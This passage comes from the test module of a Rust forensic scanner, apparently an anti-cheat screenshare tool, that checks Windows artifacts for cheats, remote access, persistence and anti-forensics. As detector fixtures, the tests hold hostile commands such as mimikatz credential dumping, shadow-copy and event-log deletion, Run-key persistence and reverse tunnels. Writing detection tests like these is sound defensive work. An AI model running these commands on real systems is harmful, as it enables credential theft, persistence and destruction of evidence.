        map.insert(r"\device\harddiskvolume3".to_string(), "C:".to_string());
        map.insert(r"\device\harddiskvolume4".to_string(), "D:".to_string());
        map.insert(r"\device\harddiskvolume8".to_string(), "F:".to_string());

        assert_eq!(
            map_device_path_to_drive_with_map(
                r"\Device\HarddiskVolume3\Windows\System32\notepad.exe",
                &map
            ),
            Some(r"C:\Windows\System32\notepad.exe".to_string())
        );
        assert_eq!(
            map_device_path_to_drive_with_map(r"\Device\HarddiskVolume8\Tools\usbtool.exe", &map),
            Some(r"F:\Tools\usbtool.exe".to_string())
        );
        assert_eq!(
            map_device_path_to_drive_with_map(
                r"\Device\HarddiskVolume9\Windows\System32\cmd.exe",
                &map
            ),
            Some(r"I:\Windows\System32\cmd.exe".to_string())
        );
    }

    #[test]
    fn fallback_volume_letter_rules() {
        for n in 1..=26u32 {
            let expected = (b'A' + (n as u8 - 1)) as char;
            assert_eq!(fallback_drive_letter_from_volume(n), Some(expected));
        }
        assert_eq!(fallback_drive_letter_from_volume(3), Some('C'));
        assert_eq!(fallback_drive_letter_from_volume(4), Some('D'));
        assert_eq!(fallback_drive_letter_from_volume(0), None);
        assert_eq!(fallback_drive_letter_from_volume(27), None);
    }

    #[test]
    fn non_primary_disk_filter_rules() {
        let mut items = BTreeSet::new();
        items.insert(r"A:\Legacy\oldtool.exe".to_string());
        items.insert(r"B:\Legacy\oldtool2.exe".to_string());
        items.insert(r"C:\Windows\System32\notepad.exe".to_string());
        items.insert(r"D:\Games\game.exe".to_string());
        items.insert(r"E:\Extra\portable.exe".to_string());
        items.insert(r"F:\USB\tool.exe".to_string());
        items.insert(r"Z:\Net\agent.exe".to_string());
        items.insert(r"\Device\HarddiskVolume40\Windows\System32\cmd.exe".to_string());
        items.insert(
            r"\\Users\jumarf\AppData\Local\Programs\Microsoft VS Code\Code.exe".to_string(),
        );
        items.insert(
            r"\\REGISTRY\MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\APPCOMPATFLAGS\CUSTOM\KLDW.EXE"
                .to_string(),
        );
        items.insert(
            r"F:\Xml NtFs rosoft Visual Studio\2022\Bu Microsoft.VC143.DebugCRT143 NtFs get\debug\.fingerprint\index network-rust-2be103baf4d6391f NtFs get\debug\.fingerprint\netwo rustc_version-c7023697890787c1 NtFs dows\SystemTemp\scoped_dir13 network-rust-e59c496f6e27f728 FSim FSim WF: FSim -x64\lib\net8.0\pt-BR\PresentationUI.resources.dll".to_string(),
        );
        items.insert(
            r"g:\Windows\WinSxS\wow64_microsoft-windows-m..dac-rds-persist-dll_31bf3856ad364e35_10.0.19041.3636_none_13996cce110ad4d1\f\msdaprst.dlle ice\HarddiskVolume3\Windows\wow64_microsoft-windows-t..lservices-workspace_31bf3856ad364e35_10.0.19041.4355_none_4ffdca8643b9c2e4a\Windows\WinSxS\wow64_microsoft-windows-m..dac-rds-persist-dll_31bf3856ad364e35_10.0.19041.3636_none_13996cce110ad4d1\r\msdaprst.dll".to_string(),
        );
        items.insert(
            r"y:\Users\jumarf\Documents\cheat\findrust\target\debug\deps\RSS_Analys.d1pzvghxvzeces2sr55gt44iq.0unxuwp.rcgu.o .exe".to_string(),
        );
        let out = filter_paths_not_on_primary_disks(&items, &['C', 'D']);
        assert!(out.contains(r"A:\Legacy\oldtool.exe"));
        assert!(out.contains(r"B:\Legacy\oldtool2.exe"));
        assert!(out.contains(r"E:\Extra\portable.exe"));
        assert!(out.contains(r"F:\USB\tool.exe"));
        assert!(out.contains(r"Z:\Net\agent.exe"));
        assert!(
            out.contains(r"\Device\HarddiskVolume40\Windows\System32\cmd.exe")
                || out.contains(r"N:\Windows\System32\cmd.exe")
        );
        assert!(!out.contains(r"C:\Windows\System32\notepad.exe"));
        assert!(!out.contains(r"D:\Games\game.exe"));
        assert!(!out.iter().any(|x| x.eq_ignore_ascii_case(
            r"\\Users\jumarf\AppData\Local\Programs\Microsoft VS Code\Code.exe"
        )));
        assert!(
            !out.iter()
                .any(|x| x.contains(r"\REGISTRY\MACHINE\SOFTWARE"))
        );
        assert!(!out.iter().any(|x| x.contains("WF: FSim")));
        assert!(!out.iter().any(|x| x.contains("HarddiskVolume3\\Windows")));
        assert!(
            !out.iter()
                .any(|x| x.contains("RSS_Analys.d1pzvghxvzeces2sr55gt44iq.0unxuwp.rcgu.o .exe"))
        );
    }

    #[test]
    fn device_tail_and_absolute_rules() {
        assert_eq!(
            device_volume_tail(r"\Device\HarddiskVolume3\Windows\System32\Taskmgr.exe"),
            Some(r"Windows\System32\Taskmgr.exe".to_string())
        );
        assert!(is_abs_win(
            r"\Device\HarddiskVolume3\Windows\System32\Taskmgr.exe"
        ));
        assert!(is_abs_win(r"C:\Windows\System32\Taskmgr.exe"));
    }

    #[test]
    fn link_parser_rejects_common_noise() {
        let ok1 = "https://github.com/test";
        let ok2 = "github.com/repo";
        let bad1 = "0.com";
        let bad2 = "03-purge.ps";
        let bad3 = "0.20.11.crate.rs";
        let bad4 = "00.mp";
        let bad5 = "0.as.sourceforge.net/player/sourceforge.net/823/919/228/569/m/abc";

        assert!(norm_link_match(ok1, 0, ok1.len(), true).is_some());
        assert!(norm_link_match(ok2, 0, ok2.len(), false).is_some());

        assert!(norm_link_match(bad1, 0, bad1.len(), false).is_none());
        assert!(norm_link_match(bad2, 3, bad2.len(), false).is_none());
        assert!(norm_link_match(bad3, 0, bad3.len(), false).is_none());
        assert!(norm_link_match(bad4, 0, bad4.len(), false).is_none());
        assert!(norm_link_match(bad5, 0, bad5.len(), false).is_none());
    }

    #[test]
    fn collect_links_skips_filename_noise_lines() {
        let mut a = Analyzer::default();
        a.collect_links("0.0.2.tmp-771b4fd7.pf");
        a.collect_links("03-purge.ps");
        a.collect_links("0.20.11.crate.rs");
        a.collect_links("00.mp");
        assert!(a.links.is_empty());

        a.collect_links("https://discord.gg/residencescreenshare");
        assert!(a.links.contains("https://discord.gg/residencescreenshare"));
    }

    #[test]
    fn parse_link_host_and_path_rejects_blocklist_like_rows() {
        assert!(parse_link_host_and_path("ad.example.com/script.js$domain=test.com").is_none());
        assert!(
            parse_link_host_and_path("https://remotedesktop.google.com/access")
                .is_some_and(|(host, path)| host == "remotedesktop.google.com" && path == "/access")
        );
        assert!(parse_link_host_and_path("autoclicker.1.exe-43cacd83.pf").is_none());
    }

    #[test]
    fn domain_without_scheme_guard_rules() {
        assert!(should_keep_domain_without_scheme(
            "discord.gg/residencescreenshare"
        ));
        assert!(!should_keep_domain_without_scheme("yandex.ru"));
        assert!(should_keep_domain_without_scheme("keyauth.win"));
    }

    #[test]
    fn suspicious_links_filter_rules() {
        let links = BTreeSet::from([
            "ad.example.com/script.js$domain=test.com".to_string(),
            "https://keyauth.win/download".to_string(),
            "https://yandex.ru".to_string(),
        ]);
        let out = suspicious_links(&links);
        assert!(out.contains("https://keyauth.win/download"));
        assert!(!out.iter().any(|x| x.contains("$domain=")));
        assert!(!out.contains("https://yandex.ru"));
    }

    #[test]
    fn remote_collectors_rules() {
        let links = BTreeSet::from([
            "https://remotedesktop.google.com/access".to_string(),
            "https://teamviewer.com/en/".to_string(),
            "https://example.com/".to_string(),
        ]);
        let remote_domains = collect_remote_domain_hits(&links);
        assert!(
            remote_domains
                .iter()
                .any(|x| x.contains("remotedesktop.google.com"))
        );
        assert!(remote_domains.iter().any(|x| x.contains("teamviewer.com")));

        let ioc = BTreeSet::from([r#"cmd /c start "" "C:\Tools\AnyDesk.exe""#.to_string()]);
        let hits = collect_remote_session_hits(&[&ioc]);
        assert!(hits.iter().any(|x| x.contains("anydesk")));
    }

    #[test]
    fn keyword_artifacts_drop_search_noise_and_cache_paths() {
        let items = BTreeSet::from([
            r"C:\Users\jumarf\AppData\Local\Yandex\YandexBrowser\User Data\Default\Service Worker\CacheStorage\abc\AnyDesk.exe".to_string(),
            r"C:\Program Files\AnyDesk\AnyDesk.exe".to_string(),
        ]);
        let links = BTreeSet::from([
            "https://yandex.ru/search/?text=anydesk".to_string(),
            "https://download.anydesk.com/AnyDesk.exeef".to_string(),
            "https://support.anydesk.com/docs/error-messages?utm_source=adwin".to_string(),
        ]);
        let out = collect_keyword_artifacts(&items, &links, REMOTE_ACCESS_KEYWORDS);
        assert!(
            out.iter()
                .any(|x| x.contains(r"file | anydesk | C:\Program Files\AnyDesk\AnyDesk.exe"))
        );
        assert!(!out.iter().any(|x| x.contains("CacheStorage")));
        assert!(
            out.iter()
                .any(|x| x.contains("link | anydesk | download.anydesk.com/AnyDesk.exe"))
        );
        assert!(!out.iter().any(|x| x.contains("yandex.ru/search")));
    }

    #[test]
    fn keyword_match_respects_boundaries_for_dot_keywords() {
        assert!(keyword_match_lc(r"c:\tools\tor.exe", "tor.exe"));
        assert!(!keyword_match_lc(r"c:\tools\monitor.exe", "tor.exe"));
    }

    #[test]
    fn keyword_links_skip_low_value_hosts_without_signal_path() {
        let links = BTreeSet::from([
            "https://github.com/search?q=autoclicker".to_string(),
            "https://github.com/ApexWeed/AutoClicker/releases/tag/v1.3.1".to_string(),
        ]);
        let out = collect_keyword_link_artifacts(&links, CHEAT_ARTIFACT_KEYWORDS);
        assert!(
            out.iter()
                .any(|x| x.contains("github.com/ApexWeed/AutoClicker/releases/tag/v1.3.1"))
        );
        assert!(!out.iter().any(|x| x == "link | autoclicker | github.com"));
    }

    #[test]
    fn suspicious_domains_are_host_scoped() {
        let links = BTreeSet::from([
            "https://yandex.ru/search/?text=keyauth".to_string(),
            "https://keyauth.win/download".to_string(),
            "https://www.unknowncheats.me/forum/rust/".to_string(),
        ]);
        let out = collect_suspicious_domain_hits(&links);
        assert!(out.iter().any(|x| x.contains("keyauth.win")));
        assert!(out.iter().any(|x| x.contains("unknowncheats.me")));
        assert!(!out.iter().any(|x| x.contains("yandex.ru")));
    }

    #[test]
    fn persistence_detector_ignores_run_key_delete() {
        let ioc = BTreeSet::from([
            r#"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v bad /f"#.to_string(),
            r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v bad /t REG_SZ /d "cmd.exe /c C:\Users\Public\bad.exe" /f"#.to_string(),
        ]);
        let out = collect_persistence_hits(&[&ioc]);
        assert!(
            out.iter()
                .any(|x| x.starts_with("run_key |") && x.contains("reg add"))
        );
        assert!(!out.iter().any(|x| x.contains("reg delete")));
    }

    #[test]
    fn persistence_detector_ignores_schtasks_help_rows() {
        let ioc = BTreeSet::from([
            r#""SCHTASKS /CREATE /?""#.to_string(),
            r#"schtasks /create /tn Updater /tr "C:\Users\Public\u.exe" /sc onlogon"#.to_string(),
        ]);
        let out = collect_persistence_hits(&[&ioc]);
        assert!(out.iter().any(|x| x.contains("scheduled_task")));
        assert!(!out.iter().any(|x| x.contains("/?")));
    }

    #[test]
    fn anti_forensics_detector_picks_log_and_shadow_cleanup() {
        let ioc = BTreeSet::from([
            "wevtutil cl System".to_string(),
            "vssadmin delete shadows /all /quiet".to_string(),
        ]);
        let out = collect_anti_forensics_hits(&[&ioc]);
        assert!(out.iter().any(|x| x.starts_with("event_log_clear |")));
        assert!(out.iter().any(|x| x.starts_with("shadow_copy_delete |")));
    }

    #[test]
    fn tunnel_command_detector_picks_common_tunnels() {
        let ioc = BTreeSet::from([
            "cloudflared tunnel --url http://localhost:3000".to_string(),
            "ngrok tcp 3389".to_string(),
            "ssh -R 2222:localhost:22 root@example.com".to_string(),
        ]);
        let out = collect_network_tunnel_command_hits(&[&ioc]);
        assert!(out.iter().any(|x| x.contains("cloudflare_tunnel")));
        assert!(out.iter().any(|x| x.contains("ngrok_tunnel")));
        assert!(out.iter().any(|x| x.contains("reverse_tunnel")));
    }

    #[test]
    fn tunnel_domains_collected_from_links() {
        let links = BTreeSet::from([
            "https://ab12cd.ngrok-free.app/index".to_string(),
            "https://trycloudflare.com/".to_string(),
            "https://example.com/".to_string(),
        ]);
        let out = collect_tunnel_domain_hits(&links);
        assert!(out.iter().any(|x| x.contains("ngrok-free.app")));
        assert!(out.iter().any(|x| x.contains("trycloudflare.com")));
        assert!(!out.iter().any(|x| x.contains("example.com")));
    }

    #[test]
    fn tunnel_hits_drop_host_only_link_noise() {
        let mut hits = BTreeSet::from([
            "link | wireguard | www.wireguard.com".to_string(),
            "link | ngrok | download.ngrok.com/windows.zip".to_string(),
        ]);
        hits.retain(|row| is_high_signal_network_tunnel_hit(row));
        assert!(!hits.iter().any(|x| x.contains("www.wireguard.com")));
        assert!(
            hits.iter()
                .any(|x| x.contains("download.ngrok.com/windows.zip"))
        );
    }

    #[test]
    fn triage_skips_generic_yara_noise() {
        let empty = BTreeSet::new();
        let yara = BTreeSet::from([
            r"C:\Windows\System32\kernel32.dll | obf".to_string(),
            r"C:\Program Files\Cheat Engine\cheatengine-x86_64.exe | CheatC".to_string(),
        ]);
        let out = collect_triage_priority_hits(
            &empty, &empty, &empty, &empty, &empty, &empty, &empty, &empty, &empty, &empty, &empty,
            &yara,
        );
        assert!(out.iter().any(|x| x.contains("CheatC")));
        assert!(!out.iter().any(|x| x.contains("kernel32.dll | obf")));
    }

    #[test]
    fn artifact_wipe_beta_rules() {
        let ioc = BTreeSet::from([
            "sdelete.exe -p 35 C:\\test.bin".to_string(),
            "wevtutil cl System".to_string(),
            "del C:\\Windows\\Prefetch\\*.pf".to_string(),
            "Clear-RecycleBin -Force".to_string(),
            "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /f".to_string(),
        ]);
        let out = collect_artifact_wipe_hits(&[&ioc]);
        assert!(out.iter().any(|x| x.contains("wipe_tool")));
        assert!(out.iter().any(|x| x.contains("event_log_clear")));
        assert!(out.iter().any(|x| x.contains("prefetch_wipe")));
        assert!(out.iter().any(|x| x.contains("recyclebin_wipe")));
        assert!(out.iter().any(|x| x.contains("usb_history_delete")));
    }

    #[test]
    fn data_hiding_beta_rules() {
        let ioc = BTreeSet::from([
            "echo abc > file.txt:hidden".to_string(),
            "openstego --embed -mf in.txt -cf img.jpg -sf out.jpg".to_string(),
            "streams.exe -s C:\\Users\\Public".to_string(),
            "div { overflow:hidden; }".to_string(),
        ]);
        let out = collect_data_hiding_hits(&[&ioc], &BTreeSet::new(), &BTreeSet::new());
        assert!(out.iter().any(|x| x.contains("alternate_data_stream")));
        assert!(out.iter().any(|x| x.contains("steganography_tool")));
        assert!(out.iter().any(|x| x.contains("ads_streams_tool")));
        assert!(!out.iter().any(|x| x.contains("overflow:hidden")));
    }

    #[test]
    fn data_hiding_openvpn_requires_real_config_target() {
        let ioc = BTreeSet::from([
            r#""C:\Program Files\OpenVPN\bin\openvpn.exe" --pause-exit --config "%1""#.to_string(),
            r#""C:\Program Files\OpenVPN\bin\openvpn.exe" --config "C:\vpn\client.ovpn""#
                .to_string(),
        ]);
        let out = collect_data_hiding_hits(&[&ioc], &BTreeSet::new(), &BTreeSet::new());
        assert!(out.iter().any(|x| x.contains("covert_network_channel")));
        assert!(!out.iter().any(|x| x.contains("%1")));
    }

    #[test]
    fn data_hiding_drops_narrative_ramdisk_text() {
        let ioc = BTreeSet::from([
            "ImDisk makes sense, high level access to the CPU to create the RAMdisk causes the anti cheat to get stuck in a loop.".to_string(),
        ]);
        let out = collect_data_hiding_hits(&[&ioc], &BTreeSet::new(), &BTreeSet::new());
        assert!(!out.iter().any(|x| x.contains("ramdisk_storage")));
    }

    #[test]
    fn trail_obfuscation_beta_rules() {
        let ioc = BTreeSet::from([
            "timestomp.exe C:\\test.exe -m 01/01/2012 00:00:00".to_string(),
            "exiftool -allDates=\"2012:01:01 00:00:00\" img.jpg".to_string(),
            "AddressCreationTimestamp".to_string(),
        ]);
        let out = collect_trail_obfuscation_hits(&[&ioc]);
        assert!(out.iter().any(|x| x.contains("mace_timestomp_tool")));
        assert!(out.iter().any(|x| x.contains("exif_timestamp_forgery")));
        assert!(!out.iter().any(|x| x.contains("AddressCreationTimestamp")));
    }

    #[test]
    fn tool_evasion_beta_rules() {
        let ioc = BTreeSet::from([
            "dkom unlink eprocess".to_string(),
            "bcdedit /set testsigning on".to_string(),
            "!!preprocessedParams".to_string(),
            "https://github.com/memN0ps/redlotus-rs Rusty Bootkit".to_string(),
        ]);
        let out = collect_tool_evasion_hits(&[&ioc], &BTreeSet::new());
        assert!(out.iter().any(|x| x.contains("memory_forensics_evasion")));
        assert!(out.iter().any(|x| x.contains("boot_policy_tamper")));
        assert!(!out.iter().any(|x| x.contains("preprocessedParams")));
        assert!(!out.iter().any(|x| x.contains("redlotus-rs")));
    }

    #[test]
    fn tool_evasion_drops_uefi_driver_blob_noise() {
        let ioc = BTreeSet::from([r#"ServiceBinary = %13%\UEFI.sys"#.to_string()]);
        let out = collect_tool_evasion_hits(&[&ioc], &BTreeSet::new());
        assert!(!out.iter().any(|x| x.contains("boot_firmware_evasion")));
    }

    #[test]
    fn persistence_drops_templates_and_benign_autorun() {
        let ioc = BTreeSet::from([
            r#"/c "schtasks /create /xml "{0}" /tn {1} /f""#.to_string(),
            r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Discord /d "\"C:\Users\gfmhk\AppData\Local\Discord\Update.exe\" --processStart Discord.exe" /f"#.to_string(),
            r#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /d "cmd.exe /c C:\Users\Public\loader.bat" /f"#.to_string(),
        ]);
        let out = collect_persistence_hits(&[&ioc]);
        assert!(!out.iter().any(|x| x.contains("{0}")));
        assert!(!out.iter().any(|x| x.contains("discord\\update.exe")));
        assert!(out.iter().any(|x| x.contains("run_key")));
    }

    #[test]
    fn credential_detector_drops_signature_noise() {
        let ioc = BTreeSet::from([
            "HEUR:Trojan-PSW.PowerShell.Mimikatz.gen".to_string(),
            r#"mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit"#.to_string(),
        ]);
        let out = collect_credential_command_hits(&[&ioc]);
        assert!(out.iter().any(|x| x.contains("mimikatz_credentials")));
        assert!(!out.iter().any(|x| x.contains("HEUR:Trojan")));
    }

    #[test]
    fn command_ioc_detects_anti_forensics_patterns() {
        let line = "wevtutil cl System";
        let lower = line.to_ascii_lowercase();
        assert!(is_command_ioc_lc(line, &lower));
    }

    #[test]
    fn screenshare_yara_profile_drops_framework_noise() {
        assert!(!should_scan_yara_target_screenshare(
            r"C:\Program Files\dotnet\sdk\9.0.310\ref\net9.0\mscorlib.dll"
        ));
        assert!(should_scan_yara_target_screenshare(
            r"C:\Program Files\Cheat Engine\cheatengine-x86_64.exe"
        ));
    }

    #[test]
    fn path_quality_rejects_joined_tail_noise() {
        assert!(has_path_quality_red_flags(
            r"C:\Program Files (x86)\Radmin VPN\QtQuick\Dialogs\images\critical.png FileTracker32UI.dll"
        ));
    }

    #[test]
    fn high_signal_tool_link_path_rules() {
        assert!(is_high_signal_tool_link_path("/releases/tag/1.4.0"));
        assert!(is_high_signal_tool_link_path("/download/AnyDesk.exe"));
        assert!(!is_high_signal_tool_link_path("/releases/tag/1.4.0Release"));
        assert!(!is_high_signal_tool_link_path(
            "/download/anydesk-5-5-3anydesk-5-5-3"
        ));
        assert!(!is_high_signal_tool_link_path("/releases/tag/1.4.0n"));
    }

    #[test]
    fn download_links_rules() {
        let mut links = BTreeSet::new();
        links.insert("https://ayevor.com/123.jar".to_string());
        links.insert("https://example.com/nope.txt".to_string());
        links.insert("cdn.host/payload.exe?x=1".to_string());
        let out = collect_download_links(&links);
        assert!(out.contains("ayevor.com | 123.jar | https://ayevor.com/123.jar"));
        assert!(
            out.iter()
                .any(|x| x.contains("cdn.host | payload.exe | cdn.host/payload.exe?x=1"))
        );
        assert!(!out.iter().any(|x| x.contains("nope.txt")));
    }

    #[test]
    fn prefetch_name_and_path_normalization_rules() {
        assert_eq!(
            normalize_prefetch_name(r"\??\C:\Windows\Prefetch\AMDRSSRCEXT.EXE-A391DDC1.pf"),
            Some("AMDRSSRCEXT.EXE-A391DDC1.pf".to_string())
        );
        assert_eq!(
            normalize_prefetch_name(
                r"C:\Windows\Prefetch\SHA256_FROM_TXT-3A26EB0B16B64-59689185.pf"
            ),
            Some("SHA256_FROM_TXT-3A26EB0B16B64-59689185.pf".to_string())
        );
        assert_eq!(
            normalize_prefetch_name("DLLHOST.EXE-4B6CB38A.pf"),
            Some("DLLHOST.EXE-4B6CB38A.pf".to_string())
        );
        assert_eq!(normalize_prefetch_name("*.pf"), None);
        assert_eq!(normalize_prefetch_name(".pf"), None);
        assert_eq!(normalize_prefetch_name("custom_prefetch_name.pf"), None);
        assert_eq!(normalize_prefetch_name("DLLHOST.EXE-XYZ12345.pf"), None);
        assert_eq!(normalize_prefetch_name("DLLHOST.EXE-4B6CB38A.txt"), None);
        assert_eq!(
            norm_file_candidate(r"\??\C:\Windows\Prefetch\AMDRSSRCEXT.EXE-A391DDC1.pf"),
            Some(r"C:\Windows\Prefetch\AMDRSSRCEXT.EXE-A391DDC1.pf".to_string())
        );
    }

    #[test]
    fn prefetch_program_resolution_rules() {
        assert_eq!(
            prefetch_program_hint("STEAMWEBHELPER.EXE-58917903.pf"),
            Some("STEAMWEBHELPER.EXE".to_string())
        );
        assert_eq!(
            prefetch_program_candidate_names("STEAMWEBHELPER.EXE-58917903.pf"),
            vec!["steamwebhelper.exe".to_string()]
        );
        assert_eq!(
            prefetch_program_candidate_names("RSS_ANALYS-8A1274FB524D1C-83376ACB.pf"),
            vec!["rss_analys-8a1274fb524d1c.exe".to_string()]
        );

        let mut prefetch_found = BTreeSet::new();
        prefetch_found.insert(r"C:\Windows\Prefetch\STEAMWEBHELPER.EXE-58917903.pf".to_string());
        let prefetch_deleted = BTreeSet::new();
        let mut name_index: HashMap<String, BTreeSet<String>> = HashMap::new();
        name_index.insert(
            "steamwebhelper.exe".to_string(),
            BTreeSet::from([r"C:\Program Files\Steam\steamwebhelper.exe".to_string()]),
        );

        let (rows, program_deleted) =
            build_prefetch_program_status_rows(&prefetch_found, &prefetch_deleted, &name_index);
        assert!(
            rows.contains(
                "STEAMWEBHELPER.EXE-58917903.pf | C:\\Program Files\\Steam\\steamwebhelper.exe | no deleted"
            )
        );
        assert!(program_deleted.is_empty());

        let (rows2, program_deleted2) =
            build_prefetch_program_status_rows(&prefetch_found, &prefetch_deleted, &HashMap::new());
        assert!(
            rows2.contains("STEAMWEBHELPER.EXE-58917903.pf | STEAMWEBHELPER.EXE | program deleted")
        );
        assert!(program_deleted2.contains("STEAMWEBHELPER.EXE"));
    }

    #[test]
    fn chained_full_paths_are_trimmed_to_last_root() {
        let p = norm_file_candidate(
            r"C:\Common Files\Java\Java Update\jucheck.exe\Device\HarddiskVolume3\Windows\System32\notepad.exe",
        );
        assert!(
            p.as_deref()
                .is_some_and(|v| v
                    .eq_ignore_ascii_case(r"\Device\HarddiskVolume3\Windows\System32\notepad.exe"))
                || p.as_deref()
                    .is_some_and(|v| v.eq_ignore_ascii_case(r"C:\Windows\System32\notepad.exe"))
        );
        assert_eq!(
            norm_file_candidate(
                r"C:\DesC:\Users\jumarf\Desktop\AI\botai2\v2\target\debug\build\memoffset-6245e5e58343551b\build-script-build.exe"
            ),
            Some(
                r"C:\Users\jumarf\Desktop\AI\botai2\v2\target\debug\build\memoffset-6245e5e58343551b\build-script-build.exe"
                    .to_string()
            )
        );
    }

    #[test]
    fn broken_device_markers_are_rejected() {
        assert_eq!(
            norm_file_candidate(
                r"C:\Device\HarddiskVoluHRSS_Analys-8a1274fb524d1c60.0udujhqakcu8n0x22jjh5f68w.0057mzv.rcgu.otc.exe"
            ),
            None
        );
    }

    #[test]
    fn dps_and_process_start_rows_collected() {
        let mut a = Analyzer::default();
        a.analyze_fragment("!!START.exe!2024/12/12:08:14:53!0!");
        assert!(
            a.dps_events.iter().any(|(f, ts)| {
                f.eq_ignore_ascii_case("start.exe") && ts == "2024/12/12:08:14:53"
            })
        );
        assert!(
            a.dps_files
                .iter()
                .any(|x| x.eq_ignore_ascii_case("start.exe"))
        );

        a.analyze_fragment(r"X@ProcessStart,\??\C:\Windows\system32\MSI.dll");
        assert!(a.start.contains(r"C:\Windows\system32\MSI.dll"));
    }

    #[test]
    fn file_time_hints_are_applied_to_status_rows() {
        let mut a = Analyzer::default();
        a.analyze_fragment(r#"C:\Users\test\AppData\Roaming\tool\loader.exe 2025-11-17 14:22:01"#);

        let found = BTreeSet::from([r"C:\Users\test\AppData\Roaming\tool\loader.exe".to_string()]);
        let rows = make_status_rows(&found, &BTreeSet::new(), &a.file_time_hints);
        assert!(rows.iter().any(|row| row.contains("2025-11-17 14:22:01")));
        assert!(rows.iter().any(|row| row.contains("| no deleted")));
    }

    #[test]
    fn file_dates_rows_include_all_hints() {
        let mut a = Analyzer::default();
        a.analyze_fragment(
            r#"C:\Users\test\AppData\Roaming\tool\loader.exe 2025-11-17 14:22:01 2025-11-18 15:01:09"#,
        );
        let rows = build_file_dates_rows(&a);
        let one = rows
            .iter()
            .find(|row| row.contains("loader.exe"))
            .cloned()
            .unwrap_or_default();
        assert!(one.contains("2025-11-17 14:22:01"));
        assert!(one.contains("2025-11-18 15:01:09"));
    }

    #[test]
    fn yara_rule_names_extracted() {
        let src = r#"
            rule CheatA { condition: true }
            private rule triggerbot_x { condition: true }
            global private rule obf_001 { condition: true }
        "#;
        let names = extract_yara_rule_names(src);
        assert!(names.contains("CheatA"));
        assert!(names.contains("triggerbot_x"));
        assert!(names.contains("obf_001"));
    }

    #[test]
    fn system_informer_like_string_extraction_basic() {
        let mut blob = Vec::new();
        blob.extend_from_slice(b"xxmemcpy\x00memmove\x00");
        let wide: Vec<u8> = "deString"
            .encode_utf16()
            .flat_map(|w| w.to_le_bytes())
            .collect();
        blob.extend_from_slice(&wide);

        let strings = extract_strings_system_informer(&blob, 6, false);
        assert!(strings.iter().any(|s| s.contains("memcpy")));
        assert!(strings.iter().any(|s| s.contains("memmove")));
        assert!(strings.iter().any(|s| s.contains("deString")));
    }

    #[test]
    fn process_selection_parses_names_and_pids() {
        let sel = parse_process_selection_line("javaw / svchost, 123 456");
        assert!(sel.names.contains("javaw"));
        assert!(sel.names.contains("svchost"));
        assert!(sel.pids.contains(&123));
        assert!(sel.pids.contains(&456));
    }

    #[test]
    fn strings_file_scope_to_process_name() {
        assert_eq!(
            parse_target_process_from_strings_file_name(Path::new("javaw.txt")),
            Some("javaw".to_string())
        );
        assert_eq!(
            parse_target_process_from_strings_file_name(Path::new("svchost.exe.txt")),
            Some("svchost".to_string())
        );
        assert_eq!(
            parse_target_process_from_strings_file_name(Path::new("custom_rules.txt")),
            None
        );
    }

    #[test]
    fn deleted_noise_filters_reduce_garbage() {
        assert!(!should_include_deleted_name("0-0.dll"));
        assert!(!should_include_deleted_name("0001tost.exe"));
        assert!(!should_include_deleted_name("svchost.exe"));
        assert!(!should_include_deleted_name("javaw.exe"));
        assert!(should_include_deleted_name("doomsday_loader.exe"));
        assert!(!should_include_prefetch_deleted_name(
            "SVCHOST.EXE-4B6CB38A.pf"
        ));
        assert!(should_include_prefetch_deleted_name(
            "DOOMSDAY.EXE-4B6CB38A.pf"
        ));

        assert!(should_include_deleted_path(r"A:\Legacy\oldtool.exe"));
        assert!(!should_include_deleted_path(
            r"C:\Users\jumarf\AppData\Local\Temp\lib-bitflags.dll"
        ));
        assert!(!should_include_deleted_path(
            r"C:\.32\es\UIAutomationTypes.resources.dll"
        ));
        assert!(!should_include_deleted_path(r"C:\path\abc.dll.dll"));
    }

    #[test]
    fn fast_input_filter_keeps_relevant_lines() {
        let empty_needles = fast_needles(&[]);
        assert!(should_keep_for_fast_analysis_line(
            r"C:\Users\test\AppData\Roaming\evil\loader.exe",
            &empty_needles
        ));
        assert!(should_keep_for_fast_analysis_line(
            "https://discord.gg/residencescreenshare",
            &empty_needles
        ));
        assert!(should_keep_for_fast_analysis_line(
            r"cmd /c reg delete HKEY_CURRENT_USER\\Software\\Bad /f",
            &empty_needles
        ));
        assert!(!should_keep_for_fast_analysis_line(
            "QwErTyUiOpAsDfGhJkLzXcVbNm",
            &empty_needles
        ));
        let custom_needles = fast_needles(&["customneedle"]);
        assert!(should_keep_for_fast_analysis_line(
            "xXxCustomNeedlexXx",
            &custom_needles
        ));
        assert!(!should_keep_for_fast_analysis_line(
            r#"if line.eq_ignore_ascii_case(last_line) {\n+ return Ok(false);\n+ }"#,
            &empty_needles
        ));
    }

    #[test]
    fn custom_rule_header_formats_supported() {
        assert_eq!(
            parse_rule_header("rule Syracuse:"),
            Some("Syracuse".to_string())
        );
        assert_eq!(
            parse_rule_header("rule Syracuse"),
            Some("Syracuse".to_string())
        );
        assert_eq!(parse_rule_header("RULE client"), Some("client".to_string()));
    }

    #[test]
    fn custom_min_formats_supported() {
        assert_eq!(parse_min_hits_line("min 2"), Some(2));
        assert_eq!(parse_min_hits_line("min: 3"), Some(3));
        assert_eq!(parse_min_hits_line("min=4"), Some(4));
        assert!(is_min_hits_directive("min (колво от которых детект)"));
        assert!(!is_min_hits_directive("mint"));
    }

    #[test]
    fn animated_progress_fill_rules() {
        let s0 = animated_progress_fill(0, 8, 24, 0);
        assert_eq!(s0.len(), 24);
        assert!(s0.starts_with('>'));
        assert_eq!(s0.chars().filter(|c| *c == '#').count(), 0);

        let s = animated_progress_fill(4, 8, 24, 5);
        let filled = 24 * 4 / 8;
        let marker = s.find('>').unwrap_or(0);
        assert!(marker < filled.max(1));
        assert_eq!(s.chars().filter(|c| *c == '-').count(), 24 - filled);

        let s_done = animated_progress_fill(8, 8, 24, 7);
        assert_eq!(s_done.chars().filter(|c| *c == '#').count(), 24);
        assert_eq!(s_done.find('>'), None);
    }

    #[test]
    fn custom_matcher_process_scope_rules() {
        let scoped_only = vec![CustomRule {
            client: "rule_scoped".to_string(),
            patterns: vec!["abc".to_string()],
            min_hits: 1,
            source: "scoped.txt".to_string(),
